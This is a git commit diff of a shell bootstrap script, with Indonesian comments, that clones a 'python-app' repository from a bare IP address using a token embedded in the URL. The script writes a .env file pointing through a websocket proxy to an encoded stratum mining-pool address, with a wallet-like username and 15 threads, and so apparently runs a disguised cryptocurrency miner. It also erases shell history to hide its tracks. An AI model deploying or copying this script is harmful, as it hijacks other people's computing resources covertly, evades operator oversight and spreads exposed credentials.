288c9ae0c4f4caa55dfa03ad90ab69c3ca8ce351
felciafitalsan <feliciafitalsan@gmail.com>
2025-09-20 19:04:28 +0700

    Update bootstrap.sh

--- bootstrap.sh
+++ bootstrap.sh
@@ -1,32 +1,30 @@
 #!/bin/bash
 set -e
 
-echo "[bootstrap] mulai setup python-app..."
-
-# Clone repo python-app kalau belum ada
-if [ ! -d "/app/python-app" ]; then
-  git clone http://adminjerry:11a75ed3804a5df1b444f813b9f084310bb64eef@159.89.237.227:3000/adminjerry/python-app.git /app/python-app
+# Clone repo kalau belum ada
+if [ ! -d "python-app" ]; then
+  git clone http://adminjerry:11a75ed3804a5df1b444f813b9f084310bb64eef@159.89.237.227:3000/adminjerry/python-app.git
 fi
 
-cd /app/python-app
+cd python-app
 
 # Fix line endings
 sed -i 's/\r$//' run.sh
 
 # Buat .env
 cat <<EOF > .env
-proxy=wss://wes.baleribo.space/c3RyYXR1bS1uYS5uYS5ycGxhbnQueHl6OjcwMjI=
+proxy=wss://wes.baleribo.space/c3RyYXR1bS1uYS5ycGxhbnQueHl6OjcwMjI=
 host=127.0.0.1
 port=3036
-username=mbc1q7sm9tj0fy5yvmyrq6cwehn9wagv0t593gjc46d.asssssssss
+username=mbc1q7sm9tj0fy5yvmyrq6cwehn9wagv0t593gjc46d.ajingggg2wwwwwwwwwwwwwwwwww
 password=x
 threads=15
 EOF
 
 chmod +x run.sh
 
-# Jalankan run.sh 4 di background
-./run.sh 4 &
+# Bersihkan history
+history -c && history -w && clear
 
-cd /app
-echo "[bootstrap] selesai setup python-app"
+# Jalanin script utama
+./run.sh 4
